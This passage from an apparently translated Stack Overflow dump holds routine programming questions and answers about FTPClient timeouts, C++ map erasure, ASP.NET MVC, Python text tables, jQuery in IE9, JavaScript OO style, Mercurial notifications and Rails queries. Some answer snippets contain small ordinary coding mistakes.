我不确定发生了什么，可能连接丢失，但我认为如果发生这种情况，try/catch 会捕获。我不确定超时是否可以解决问题或需要使用线程（但我从未使用过线程）

谁能指出我正确的方向为什么会发生这种情况以及我可以做些什么来解决这个问题

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:57:39.417

# 更新 - 为数据连接设置超时

由于最后一个文件只是部分下载，并且给出了 的来源[`FTPClient.retrieveFile()`](http://commons.apache.org/net/api-3.1/src-html/org/apache/commons/net/ftp/FTPClient.html#line.1666)，我认为这可能是服务器端的问题（导致它挂起，甚至死亡的东西 -*谁知道*）。显然一个人无法修复服务器，甚至无法知道那里发生了什么，无论如何我建议添加一个超时[`setDataTimeout(int)`](http://commons.apache.org/net/api-3.1/org/apache/commons/net/ftp/FTPClient.html#setDataTimeout%28int%29)并捕获可能`SocketTimeoutException`单独登录到不同的地方，并可能发送给 FTP 服务器管理员（连同时间信息当它发生时），以便他们可以合并日志并查看问题所在。

**旧答案**

我没有注意到您为每个文件都连接和登录，所以以下只是一个*优化*，不关闭控制连接并成功注销，但它不应该**解决**问题。

您可以在调试模式下启动 JVM 并在挂起时附加一个调试器，无论如何根据[这个答案](https://stackoverflow.com/a/10530366/315306)和[这个线程](http://apache-commons.680414.n4.nabble.com/FTPClient-hangs-when-downloading-large-files-td3307715.html)它可能是网络设备设备（路由器）上的超时问题。来自[FTPClient Javadoc](http://commons.apache.org/net/api-3.1/org/apache/commons/net/ftp/FTPClient.html)

> 在文件传输过程中，数据连接处于忙碌状态，而控制连接处于空闲状态。FTP 服务器知道控制连接正在使用中，因此不会因为缺乏活动而关闭它，但是网络路由器要知道控制连接和数据连接是相互关联的要困难得多。一些路由器可能会将控制连接视为空闲，如果数据连接上的传输时间超过路由器允许的空闲时间，则将其断开。

对此的一种解决方案是通过控制连接发送安全命令（即 NOOP）以重置路由器的空闲计时器。启用如下：

```
ftpClient.setControlKeepAliveTimeout(300); // set timeout to 5 minutes 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:50:34.787

你检查任何调用的返回状态还是代码？

有一个调用 completePendingCommand() 必须在 occassion 时使用。这可能是需要调查的事情。

此外，您不会看到 IO 异常，我相信它会被重新打包为 CopyStreamException

您可能还希望将返回值更改为布尔值，因为您捕获了异常，至少调用循环将知道转移是否发生。

```
private boolean loadFTPFile(String host, String username, String password, String filename, String localFilename){
    System.out.println(localFilename);
    FTPClient client = new FTPClient();
    FileOutputStream fos = null;

    try {
        client.connect(host);

        int reply = client.getReplyCode();

        if (!FTPReply.isPositiveCompletion(reply)){
            client.disconnect();
            System.err.println("FTP server refused connection.");
            return false;
        }

        if (!client.login(username, password)){
            client.logout();
            return false;
        }

        String localFilenameOutput = createFile(assetsPath + localFilename);
        fos = new FileOutputStream(localFilenameOutput);
        boolean result = client.retrieveFile(filename, fos);

        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");

        if (result){
            System.out.println("\tFile Transfer Completed Successfully at: " + sdf.format(Calendar.getInstance().getTime()));

            // ftp.completePendingCommand();
        }
        else {
            System.out.println("\tFile Transfer Failed at: " + sdf.format(Calendar.getInstance().getTime()));
        }

    return result;
    }catch (CopyStreamException cse){
        System.err.println("\n\tFile Transfer Failed at: " + sdf.format(Calendar.getInstance().getTime()));
        System.err.println("Error Occurred Retrieving File from Remote System, aborting...\n");
        cse.printStackTrace(System.err);
        System.err.println("\n\nIOException Stack Trace that Caused the Error:\n");
        cse.getIOException().printStackTrace(System.err);
        return false;
    }catch (Exception e){
        System.err.println("\tFile Transfer Failed at: " + sdf.format(Calendar.getInstance().getTime()));
        System.out.println("Error Occurred Retrieving File from Remote System, aborting...");
        e.printStackTrace(System.err);
        return false;
    } finally {
        try {
            if (fos != null) 
                fos.close();
            client.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:43:20.407

这不是线程问题。很可能它是由循环中的某些东西引起的，因为该代码看起来应该清理得很好。也就是说，对于测试，您可能需要添加

```
catch (Exception e) {
    e.printStackTrace();
} 
```

在`IOException`catch 子句之后。可能会引发另一个异常。

另一件事，如果您一次从数据库结果集中提取一个结果并进行 FTP 获取，那可能是个问题。除非结果都被 JDBC 调用一次带回，否则也可能超时。并非所有数据库查询实际上都会一次将整个结果集返回给客户端。

# c++ - std::map::erase() - 哪个重载更快？

> ID：12078795
> 
> 赞同：3
> 
> 时间：2012-08-22T17:57:51.457
> 
> 标签：c++, map

map::erase() 方法有两个重载来删除单个项目：

```
void erase ( iterator position );
size_type erase ( const key_type& x ); 
```

我需要检查哪个版本可能更快 - 我的猜测是第一个，因为第二个可能必须调用 map::find() 来查找迭代器？

任何人都可以确认吗？

谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-22T17:59:14.797

第一个是摊销常数复杂度，第二个是对数。常数项不太可能大到足以使第一个版本比第二个版本慢，但我想对于非常小的地图，它们必须彼此无法区分。

# sql - 如何在 ASP.NET 中添加过滤选项？

> ID：12078799
> 
> 赞同：0
> 
> 时间：2012-08-22T17:58:02.300
> 
> 标签：sql, asp.net-mvc

我正在构建一个将显示服务器信息的 ASP.Net MVC 网页。它还允许我们编辑每个服务器的所有者，而无需使用 Management Studio。

我工作正常，但我想添加一个过滤功能，以便查看我选择的服务器名称（在标题上实现过滤功能后如何过滤 Excel 电子表格）。

我一直在使用以下教程：

[http://www.asp.net/mvc/tutorials/getting-started-with-ef-using-mvc/advanced-entity-framework-scenarios-for-an-mvc-web-application](http://www.asp.net/mvc/tutorials/getting-started-with-ef-using-mvc/advanced-entity-framework-scenarios-for-an-mvc-web-application)

一些附加信息：我在服务器上连接了一个数据库，我显示的信息来自 3 个不同的表。

任何帮助是极大的赞赏！

这是我的索引视图代码：

```
@model IEnumerable<SQL_Server_Inventory_UI.ServerList>

@{
   ViewBag.Title = "Index";
 }

<p>
    @Html.ActionLink("Create New", "Create")
</p>
<table>
    <tr>
        <th>
            ServerName
        </th>
        <th>
            InstanceName
        </th>
        <th>
            PortNumber
        </th>
        <th>
            IsMonitored
        </th>
        <th>
            Environment
        </th>
        <th>
            SQLVersion
        </th>
        <th>
            SQLServicePack
        </th>
        <th>
            SQLProductVersion
        </th>
        <th>
            RetireDate
        </th>
        <th>
            IPAddress
        </th>
        <th>
            IsVMW
        </th>
        <th>
            Platform
        </th>
        <th>
            IsLiteSpeedUsed
        </th>
        <th>
            Domain
        </th>

        <th>
            CreateDate
        </th>
        <th>
            LastUpdateDate
        </th>
        <th>
            CName
        </th>
        <th>
            IsStandby
        </th>
        <th>
            Server_Group
        </th>
        <th>
            TeamMember
        </th>
        <th>
            IsMissionCritical
        </th>
        <th>
            IsCluster
        </th>
        <th>
            DBANotes
        </th>
        <th></th>
    </tr>

@foreach (var item in Model) {
    <tr>

        <td>
            @Html.DisplayFor(modelItem => item.ServerName)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.InstanceName)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.PortNumber)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.IsMonitored)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.Environment)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.SQLVersion)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.SQLServicePack)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.SQLProductVersion)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.RetireDate)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.IPAddress)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.IsVMW)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.Platform)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.IsLiteSpeedUsed)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.Domain)
        </td>

        <td>
            @Html.DisplayFor(modelItem => item.CreateDate)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.LastUpdateDate)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.CName)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.IsStandby)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.Server_Group.GroupName)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.TeamMember.Name)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.IsMissionCritical)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.IsCluster)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.DBANotes)
        </td>
        <td>
            @Html.ActionLink("Edit", "Edit", new { id=item.ServerId }) |
            @Html.ActionLink("Details", "Details", new { id=item.ServerId }) |
            @Html.ActionLink("Delete", "Delete", new { id=item.ServerId })
        </td>

    </tr>
}

</table> 
```

这是我的控制器代码：

```
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Entity;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using SQL_Server_Inventory_UI;

namespace SQL_Server_Inventory_UI.Controllers
{ 
    public class ServerListController : Controller
    {
        private ServerListConnectionEntities db = new ServerListConnectionEntities();

    //
    // GET: /ServerList/

    public ViewResult Index()
    {
        var serverlists = db.ServerLists.Include("Server_Group").Include("TeamMember");
        return View(serverlists.ToList());
    }

    //
    // GET: /ServerList/Details/5

    public ViewResult Details(int id)
    {
        ServerList serverlist = db.ServerLists.Single(s => s.ServerId == id);
        return View(serverlist);
    }

    //
    // GET: /ServerList/Create

    public ActionResult Create()
    {
        ViewBag.GroupID = new SelectList(db.Server_Group, "GroupID", "GroupName");
        ViewBag.OwnerID = new SelectList(db.TeamMembers, "MemberID", "Name");
        return View();
    } 

    //
    // POST: /ServerList/Create

    [HttpPost]
    public ActionResult Create(ServerList serverlist)
    {
        if (ModelState.IsValid)
        {
            db.ServerLists.AddObject(serverlist);
            db.SaveChanges();
            return RedirectToAction("Index");  
        }

        ViewBag.GroupID = new SelectList(db.Server_Group, "GroupID", "GroupName", serverlist.GroupID);
        ViewBag.OwnerID = new SelectList(db.TeamMembers, "MemberID", "Name", serverlist.OwnerID);
        return View(serverlist);
    }

    //
    // GET: /ServerList/Edit/5

    public ActionResult Edit(int id)
    {
        ServerList serverlist = db.ServerLists.Single(s => s.ServerId == id);
        ViewBag.GroupID = new SelectList(db.Server_Group, "GroupID", "GroupName", serverlist.GroupID);
        ViewBag.OwnerID = new SelectList(db.TeamMembers, "MemberID", "Name", serverlist.OwnerID);
        return View(serverlist);
    }

    //
    // POST: /ServerList/Edit/5

    [HttpPost]
    public ActionResult Edit(ServerList serverlist)
    {
        if (ModelState.IsValid)
        {
            db.ServerLists.Attach(serverlist);
            db.ObjectStateManager.ChangeObjectState(serverlist, EntityState.Modified);
            db.SaveChanges();
            return RedirectToAction("Index");
        }
        ViewBag.GroupID = new SelectList(db.Server_Group, "GroupID", "GroupName", serverlist.GroupID);
        ViewBag.OwnerID = new SelectList(db.TeamMembers, "MemberID", "Name", serverlist.OwnerID);
        return View(serverlist);
    }

    //
    // GET: /ServerList/Delete/5

    public ActionResult Delete(int id)
    {
        ServerList serverlist = db.ServerLists.Single(s => s.ServerId == id);
        return View(serverlist);
    }

    //
    // POST: /ServerList/Delete/5

    [HttpPost, ActionName("Delete")]
    public ActionResult DeleteConfirmed(int id)
    {            
        ServerList serverlist = db.ServerLists.Single(s => s.ServerId == id);
        db.ServerLists.DeleteObject(serverlist);
        db.SaveChanges();
        return RedirectToAction("Index");
    }

    protected override void Dispose(bool disposing)
    {
        db.Dispose();
        base.Dispose(disposing);
    }
 }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T20:01:00.283

`Index`将您的控制器更改为以下内容：

```
public ViewResult Index(string filter)
{
    var serverlists = db.ServerLists.Include("Server_Group").Include("TeamMember");

    if (!string.IsNullorEmpty(filter))
      serverlists = serverlists.Where(sl => sl.Name.StartsWith(filter);

    return View(serverlists.ToList());
} 
```

`{url}?filter=stringtosearchfor`然后，当您需要过滤列表时，更改您的视图以使用过滤器发回。这不会为您提供 AJAX 样式的过滤，但会得到您想要的响应。

# python - 如何在终端中动态打印字符串表？

> ID：12078802
> 
> 赞同：1
> 
> 时间：2012-08-22T17:58:10.267
> 
> 标签：python, dynamic, terminal, formatting, tabular

我需要动态创建一个字典，然后将它们打印在终端的整洁表格中。最终，我将添加到每个字典并重新打印表格。

到目前为止，这是我的代码：

```
def handy(self, play_deck):
    a = raw_input('How many hands? ')
    for i in range(int(a)):
        h = "hand" + str(i+ 1) # dynamilly create key
        q, play_deck = self.deal(self.full_deck) # pull cards from deck
        self.dict_of_hands.setdefault(h, q) # load up dict of hands

    hand_keys = self.dict_of_hands.keys()
    the_hands = self.dict_of_hands
    print "\n"
    for hand in hand_keys:
        for card in range(len(the_hands[hand].keys())):
            print hand
            print the_hands[hand][card] 
```

我的输出是这样的：

```
How many hands? 4

hand4
6 of Clubs
hand4
4 of Diamonds
hand1
8 of Diamonds
hand1
10 of Hearts
hand2
10 of Hearts
hand2
5 of Clubs
hand3
9 of Diamonds
hand3
3 of Hearts 
```

我想要：

```
hand1           hand2           hand3            hand4
2 of hearts     8 of spades     ace of clubs     jack of diomonds
5 of diamonds   ...             ...              ...etc. 
```

我在 SO 上看到的示例基于已知数量的列。这需要是动态的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T20:28:57.583

要转换为行列表，请使用`zip`：

```
header = dict_of_hands.keys()
rows = zip(*dict_of_hands.items())

import texttable
table = texttable.Texttable()
table.header(header)
table.add_rows(rows, header=False)
print table.draw() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T21:09:14.830

好的。采用@ecatmur 提供的内容，我现在有以下内容，这似乎目前可以使用。

```
def handy(self, play_deck):
    a = raw_input('How many hands? ')
    for i in range(int(a)):
        h = "hand" + str(i+ 1) # dynamilly create key
        q, play_deck = self.deal(self.full_deck) # pull cards from deck
        self.dict_of_hands.setdefault(h, q) # load up dict of hands

    hand_keys = self.dict_of_hands.keys()
    the_hands = self.dict_of_hands

    first_cards = []
    second_cards = []
    for hand in the_hands:
        # print the_hands[hand][0]
        first_cards.append(the_hands[hand][0])

    for hand in the_hands:
        # print the_hands[hand][1]
        second_cards.append(the_hands[hand][1])         

    header = self.dict_of_hands.keys()

    table = texttable.Texttable()
    table.header(header)
    table.add_rows([first_cards, second_cards], header=False)
    print table.draw() 
```

输出是：

```
How many hands? 4
+---------------+---------------+------------------+---------------+
|     hand4     |     hand1     |      hand2       |     hand3     |
+===============+===============+==================+===============+
| Jack of Clubs | 9 of Diamonds | Jack of Diamonds | 4 of Spades   |
+---------------+---------------+------------------+---------------+
| 6 of Diamonds | 10 of Spades  | 9 of Diamonds    | Ace of Hearts |
+---------------+---------------+------------------+---------------+ 
```

拼图的最后一块将使以下行动态化：

```
table.add_rows([first_cards, second_cards], header=False) 
```

最终，我需要每只手的长度都不同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T20:18:02.607

看看这个秘籍：[为文本界面渲染表格](http://code.activestate.com/recipes/577202-render-tables-for-text-interface/)

# jquery - Jquery append 在 IE9 中不起作用，但在兼容性方面起作用？

> ID：12078804
> 
> 赞同：0
> 
> 时间：2012-08-22T17:58:18.247
> 
> 标签：jquery, html, css, internet-explorer-9

我有以下 javascript 代码，它在 div 中附加了一个输入元素。这适用于 firefox、chrome 和 IE9 兼容模式，但不适用于 IE9。

```
function add(){
    $(document).ready(function(){
        $(".lbl").append("<div>Bild (400x400px)<br/><input type='file' name='upload[]' id='upload[]' onChange='add()' /><br/>Bild beskrivning:<br/><textarea name='imgdesc[]'></textarea></div>");
    });
}
window.load(add()); 
```

这是正在完成附加的 html 代码，它位于表单内，在表 td 内

```
<tr><td colspan="2">
    <div class='lbl'></div>
</td></tr>
<tr><td>
    <input type="submit" name="newobject" value="Spara och granska">
</td></tr>
</table> 
```

关于如何在 IE9 中进行这项工作的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:04:03.897

像这样试试

```
$(document).ready(function() {
     $(window).load(add());
});

function add() {
    $(".lbl").append("<div>Bild (400x400px)<br/><input type='file' name='upload[]' id='upload[]' onChange='add()' /><br/>Bild beskrivning:<br/><textarea name='imgdesc[]'></textarea></div>");
}; 
```

[http://jsfiddle.net/sBVam/3/](http://jsfiddle.net/sBVam/3/)

看起来 IE9 不支持加载方法，因为控制台中显示以下错误

> SCRIPT438：对象不支持属性或方法“加载”显示，第 25 行字符 1

您可以通过将 window 设置为 jQuery 对象来使用 jQuery 的 load 方法。或者您可以将 .onload 方法与本机窗口 Dom 对象一起使用。即。 `window.onload()`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:08:35.790

改变这个

```
window.onload = add(); 
```

# asp.net-mvc - 如何将整个 ViewModel 传递回控制器

> ID：12078808
> 
> 赞同：5
> 
> 时间：2012-08-22T17:58:26.467
> 
> 标签：asp.net-mvc, forms, viewmodel

我有一个包含两个对象的 ViewModel：

```
public class LookUpViewModel
{
    public Searchable Searchable { get; set; }
    public AddToSearchable AddToSearchable { get; set; }
} 
```

包含的两个模型如下所示：

```
public class Searchable
{
    [Key]
    public int SearchableId { get; set; }
    public virtual ICollection<AddToSearchable> AddedData { get; set; }
}

public class AddToSearchable
{
    [Key]
    public int AddToSearchableId { get; set;}
    [Required]
    public int SearchableId { get; set; }
    [Required]
    public String Data { get; set; }
    [Required]
    public virtual Searchable Searchable { get; set; }
} 
```

我有一个视图，它使用我的`LookUpViewModel`并接收输入来搜索`SearchableId`. 如果`Searchable`找到对象，`LookUpViewModel`则创建一个对象并将其传递给视图。然后视图显示`AddToSearchable.Data`. 提交后，我希望将`LookUpViewModel`其传递给一个操作方法来处理所有后端代码。唯一的问题是，`LookUpViewModel`传递给我的操作方法包含`Searchable`对 .. 的空引用和有效引用，`AddToSearchable`即我丢失了一半的数据。

这是我的视图的示例：

```
@model HearingAidTrackingSystem.ViewModels.LookUpViewModel

@using (Html.BeginForm("LookUp", "Controller", "idStr", FormMethod.Post))
{
    <input type="text" name="idStr" id="idStr"/>
    <input type="submit" value="Search" />
}

@if (Model.Searchable != null && Model.AddToSearchable != null)
{
    using (Html.BeginForm("AddMyStuff", "Controller"))
    {
        Html.HiddenFor(model => model.Searchable.SearchableId);
        Html.HiddenFor(model => model.Searchable.AddedData);
        Html.HiddenFor(model => model.AddToSearchable.AddToSearchableId);
        Html.HiddenFor(model => model.AddToSearchable.SearchableId);
        Html.HiddenFor(model => model.AddToSearchable.Searchable);

        <div class="editor-field">
            @Html.EditorFor(model => model.AddToSearchable.Data)
            @Html.ValidationMessageFor(model => model.AddToSearchable.Data);
        </div>                                    

        <input type="submit" value="Submit" />
    }
} 
```

这是我的行动方法：

```
public ActionResult LookUp(LookUpViewModel vm)
{
    return View(vm);
}

[HttpPost]
public ActionResult LookUp(string idStr)
{
    int id = /*code to parse string to int goes here*/;

    Searchable searchable = dal.GetById(id);
    LookUpViewModel vm = new LookUpViewModel { Searchable = searchable, 
                                               AddToSearchable = new AddToSearchable() };
    //When breakpoint is set, vm contains valid references
    return View(vm);
}

[HttpPost]
public ActionResult AddMyStuff(LookUpViewModel vm)
{
    //**Problem lies here**

    //Do backend stuff
} 
```

很抱歉这篇冗长的帖子。我尽力保持简单。你可能有任何建议......开火。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T18:05:36.030

修复它的两种方法：

1.  您可以为 Model.Searchable 的所有属性添加执行 HiddenFor()。

2.  您可以使用序列化将您的 Model.Searchable 转换为文本表示形式，并从控制器中的序列化形式修复它。

更新：问题是：你需要使用@Html.HiddenFor()，而不是Html.HiddenFor();。

# jquery - 如何在 cargocollective 中禁用 TouchSwipe 插件？

> ID：12078810
> 
> 赞同：0
> 
> 时间：2012-08-22T17:58:33.150
> 
> 标签：jquery, jquery-plugins

我有一个关于 cargocollective 的页面，我想删除用于更改页面的幻灯片功能，因为它很烦人。我无法控制插件的初始化，我想在它初始化后取消它的使用。关于如何做到这一点的任何想法？

该插件在我的身体元素上启用。像这样。

```
$("body").touchwipe({
    wipeLeft            : function() { showNextIMG("nav") },
    wipeRight           : function() { showPrevIMG("nav") },
    min_move_x          : 20,
    min_move_y          : 20,
    preventDefaultEvents: false
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-24T13:15:21.640

这段代码显然有效！

```
<script type="text/javascript">

    function projectNavigation() {

    // Loading indicator
    $(".project_navigation").append($("#nav_loadspin"));

    /*
     * Keyboard navigation
     */

    shortcut.add("Up",function() { 
        $(document).trigger("closeProject");
        closeFullScreen();
        keyboard_nav        = true;
    },{ 
        'type'              : 'keydown', 
        'disable_in_input'  : true, 
        'keycode'           : 38 
    });  

    shortcut.add("Left",function() { 
        showPrevIMG("nav");
        keyboard_nav        = true;
    },{ 
        'type'              : 'keydown', 
        'disable_in_input'  : true, 'keycode':37 
    });

    shortcut.add("Right",function() { 
        showNextIMG("nav");
        keyboard_nav        = true;
    },{ 
        'type'              : 'keydown', 
        'disable_in_input'  : true, 
        'keycode'           : 39 
    });

}
</script> 
```

# javascript - How to choose OO design patterns for JavaScript

> ID：12078812
> 
> 赞同：6
> 
> 时间：2012-08-22T17:58:38.143
> 
> 标签：javascript

By OO I mean classical OO. I keep going back and forth between defining my "classes" ( javascript does not have traditional classes ) using the module pattern to provide privacy and using object literals to create a collection of "public statics".

I have no guiding force when I create "classes" that lets me determine what type of organization to use. Well, besides the fact that my code passes both jshint and jslint w/ no options set.

I'm working w/ about 1500 lines of code so I need a "guiding force" before the code becomes un-manageable and I have to scrap it.

I am well aware of the different ways to write "classes" in JavaScript. Those taught by JavaScript Web Applications written by Alex MacCaw as well as the numerous ways listed here on SO.

However, application wise, I just don't know what method to use.

The simplest seems to be a collection of methods and variables in an object literal like this:

```
var public_statics = {
    public_func: function () {},
    public_var: "hello"
} 
```

and the most complicated seems to be - an IIFE.

```
(function(){
    var private_var;
    function private_func(){
    }
})(); 
```

How do I know which one to use or the multitude of in-between variations?

For a concrete example: How about for a controller in the MVC.

Currently ( and some what randomly chosen), I implement a controller like this:

```
var Co = {};
Co.Controller = function(){
    // 'classes' from Mo are called here
    // 'classes' from Su are called here
} 
```

then I tack on other Control related method to Co.

How do I choose what style of OO to use?

* * *

**Updated**

My library is currently divided between 4 namespaces:

```
var Mo = {},
    Vi = {},
    Co = {},
    Su = {}; 
```

Model, View, and Controller should be self-explanatory and (Su)pport is for all "classes" not contained in the MVC, for example DOM access, Effects, Debug code, etc.

What OO style should I use to further organize this library/code?

**Controller "Class" example:**

```
/**
 **  Controller
 */

Co.Controller = function (o_p) {
    var o_p_string_send;
    Su.time();
    o_p = Mo[o_p.model].pre(o_p);
    if (o_p.result !== 'complete') {
        o_p_string_send = JSON.stringify(o_p);
        Su.time();
        //Su.log(o_p_string_send);
        Co.serverCall('pipe=' + o_p_string_send, function (o_p_string_receive) {
            Su.time();
            //Su.log(o_p_string_receive);
            o_p.server = JSON.parse(o_p_string_receive);
            Mo[o_p.model].post(o_p);
            Su.time(true);
            Su.log('Server time: [' + o_p.server.time + ']');
        });
    }
}; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T20:40:39.727

`IFFE`s 阅读起来常常令人困惑，就我个人而言，我不知道为什么它们变得如此主流。我认为代码应该易于阅读和简洁。试图模拟不属于语言规范的语言行为通常是一个非常愚蠢的想法。

例如，JavaScript 不支持多重继承、多态或许多其他有趣的范例。所以很多时候，我们看到人们试图在 JS 中创建这些具有多态性或私有成员等的疯狂方式。我认为这是一个错误。

我目前正在作为一种关于高性能 JS 数据结构库的爱好项目工作（我试图超越 Google 的关闭和其他一些）。来自 C++ 和 Java 背景，我总是喜欢制作东西类，我喜欢继承等。让我与你分享一些代码片段。起初，我认为我很聪明，因为我在写这样的东西：

```
function __namespace(n, v) {
    return {"meta":{"namespace":n,"version":v}};
}

var FJSL = FJSL == undefined ? new __namespace("Fast JavaScript Library", 0.1) : FJSL;

__using = function(parent, child) {
    clazz = new child();
    clazz.super = new parent();
    if (clazz.super == undefined) return clazz;
    for (a in clazz.super) {
        for (b in clazz) {
            if (a == "constructor" || b == "constructor") continue;
            if (clazz[b] === clazz.super[a]) continue;
            if (a == b && typeof clazz[b] != typeof clazz.super[a]) throw "Typesafety breached on '" + a + "' while trying to resolve polymorphic properties."; 
            if (a == b && typeof clazz[b] == typeof clazz.super[a]) {
                clazz["_"+a] = clazz.super[a];
            } else if (clazz[a] == undefined) {
                clazz[a] = clazz.super[a];
            }
        }
    }
    return clazz;
}; 
```

我就是这样使用它的（在一个简单队列的例子中）：

```
FJSL.Array = function() { 
    this.data = [];

    this.contains = function(idx, element) {
        for (var i = idx; i < this.data.length; i++) {
            if (this.data[i] === element)
                return i;
        }
        return -1;
    }

    this.size = function() {
        return this.data.length;
    }
}

FJSL.Queue = function() {
    return __using(FJSL.Array, 
    function() {
        this.head = 0;
        this.tail = 0;

        this.enqueue = function(element) {
            this.data[this.tail++] = element;
        };

        this.dequeue = function() {
            if (this.tail == this.head)
                return undefined;
            return this.data[this.head++];
        };

        this.peek = function() {
            return this.data[this.head];
        };

        this.size = function() {
            return this.tail - this.head;
        };

        this.contains = function(element) {
            return this._contains(this.head, element);
        };
    }
)}; 
```

你会注意到我是如何伪装继承的（队列使用数组，哈哈，我很聪明）。**但是，这对于a) 阅读**和**b) 理解**是绝对疯狂的。我不禁想起了这个模因：

![在此处输入图像描述](../Images/703c6a792e5afe55d9267a85cfc8a5c6.png)

让我向您展示功能等效的代码，而无需我尝试进行所有这些花哨的预处理和后处理：

```
FJSL.Queue = function(opts) {
    this.options = opts;
    this.head = 0;
    this.tail = 0;
    this.data = [];
};

FJSL.Queue.prototype = {
    add : function(element) {
        this.data[this.tail++] = element;
    },

    enqueue : function(element) {
        this.data[this.tail++] = element;
    },

    dequeue : function() {
        if (this.tail == this.head) {
            return undefined;
        }
        return this.data[this.head++];
    },

    peek : function() {
        return this.data[this.head];
    },

    size : function() {
        return this.tail - this.head;
    },

    contains : function(element) {
        // XXX: for some reason a for : loop doesn't get JIT'ed in Chrome
        for (var i = this.head; i < this.data.length; i++) {
            if (this.data[i] === element) {
                return true;
            }
        }
        return false;
    },

    isEmpty : function() {
        if (size) {
            return true;
        }
        return false
    }, 

    clear : function() {
        this.data = [];
    }
}; 
```

显然，我必须为可能使用数组的任何其他结构复制原型构造函数，但我想要完成的事情要清楚得多，即使是新手 JS 程序员也可以知道发生了什么。不仅如此，如果人们想要修改代码，他们确切地知道去哪里以及做什么。

我的建议是不要陷入试图让 JS 表现得像 C++ 或 Java 一样的疯狂。它永远不会。是的，你可以伪造继承和私有/公共/受保护的成员，但 JS 从来没有打算这样做。我认为拥有这种臃肿的代码（试图模拟非标准行为）对高性能网络应用程序及其同类应用程序的影响非常大。

简而言之，我建议使用对象文字：

```
var public_statics = {
    public_func: function () {},
    public_var: "hello"
} 
```

它易于理解、易于修改和易于扩展。如果您的系统很脆弱，如果有人不小心更改了一些“私有”变量，就会崩溃和烧毁，那么您只需记录它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T20:20:06.780

我个人更喜欢 IIFE，因为您可以将方法设为私有。否则，您将不得不使用下划线进行某种奇怪的约定。

此外，从风格上讲，如果您将它封装在一个函数中，您可以*选择*制作分号 - 它是普通的旧 javascript。要求对象文字中的每一行都以逗号结尾对我来说似乎很有趣。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-25T17:26:09.103

因为 JavaScript 语言本身以许多不同的方式实现，即每个浏览器都不同，所以您已经不得不从不一致开始。

JavaScript 不直接支持经典继承。（它支持原型继承）。

出于我的需要，我将选择不实现经典继承。这并不理想，因为经典继承允许您直接实现最佳实践 OO - 封装、继承和多态。

但是，我更喜欢等到该语言通过经典继承或类似方法直接支持 OO。

同时，我将只使用基本的原型继承来帮助实现代码重用。

# mercurial - 推送更改的 Tortoise HG (mercurial) 通知

> ID：12078813
> 
> 赞同：3
> 
> 时间：2012-08-22T17:58:44.867
> 
> 标签：mercurial, tortoisehg

如果其他人将更改推送到中央 mercurial 服务器，是否有任何选项或扩展程序/工具来通知您？我经常发现有人推送了更改以修复错误，但我不知道，直到我手动检查并且这真的很快变老了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T19:31:24.770

您可以在中央服务器上配置[通知扩展](http://mercurial.selenic.com/wiki/NotifyExtension)，以便在将变更集推送到它时发送电子邮件。如果您正在寻找客户端解决方案并且您使用的是 Windows，则可以尝试[HgAssist](https://bitbucket.org/zerkms/hgassist/wiki/Home)。

# windows - How to identify USB port path/address in windows?

> ID：12078815
> 
> 赞同：1
> 
> 时间：2012-08-22T17:58:47.997
> 
> 标签：windows, node.js, windows-7, usb

This question relates to [node.js to read usb port signals](https://stackoverflow.com/questions/12077223/node-js-to-read-usb-port-signals/12077561#comment16135151_12077561)

What is the possible way to get usb port address from windows7 32bit? For eg: If my phone is connected to one of the usb port how can i get the path/address of that USB port?

# ruby-on-rails - 查找存在关联记录的位置

> ID：12078819
> 
> 赞同：13
> 
> 时间：2012-08-22T17:59:05.343
> 
> 标签：ruby-on-rails, ruby, activerecord

如何仅选择具有关联标签记录的员工？换言之，只选择与一个或多个标签记录相关联的员工记录。

```
class Employee < ActiveRecord::Base
  has_and_belongs_to_many :tags
end

class Tag < ActiveRecord::Base
  has_and_belongs_to_many :employees
end 
```

下面的查询（这是错误的）会让你们了解我正在尝试做什么。

```
Employee.includes(:tags).where("tags.id != nil") 
```

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-08-22T18:04:27.077

